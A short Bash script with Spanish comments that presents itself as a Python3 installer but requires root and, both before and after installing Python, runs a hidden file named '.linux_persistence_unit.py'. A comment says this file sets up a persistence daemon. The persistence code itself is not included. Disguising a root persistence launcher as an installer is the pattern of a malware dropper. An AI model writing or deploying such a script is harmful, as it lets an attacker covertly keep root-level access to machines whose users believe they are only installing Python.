#!/bin/bash

# Instalar Python3


# Comprobar si el usuario actual tiene permisos de administrador
if [ "$(id -u)" != "0" ]; then
    echo "Este script debe ser ejecutado como administrador. Por favor, ejecute el script con el comando 'sudo'."
    exit 1
fi
#llamamos a la unidad de  persistencia y le pasamos el script que queremos ejecutar en el demonio
# (cambiar la ruta y poner la necesaria en cada caso)
 

if type python3 >/dev/null 2>&1; then
    # Si Python3 ya está instalado, salir
    python3 ./.linux_persistence_unit.py 
    echo "Python3 ya está instalado"
    exit 0
    
fi

if type yum >/dev/null 2>&1; then
    # Para sistemas que usan yum (como CentOS)
    sudo yum install python3 -y
    echo "Python3 $(python3 --version | cut -d' ' -f2) ha sido instalado exitosamente."

elif type apt-get >/dev/null 2>&1; then
    # Para sistemas que usan apt-get (como Ubuntu)
    sudo apt-get update
    sudo apt-get install python3 -y
    echo "Python3 $(python3 --version | cut -d' ' -f2) ha sido instalado exitosamente."

else
    # Si no se puede detectar el gestor de paquetes, salir
    echo "No se puede detectar el gestor de paquetes"
    exit 1
fi

python3 ./.linux_persistence_unit.py  

 
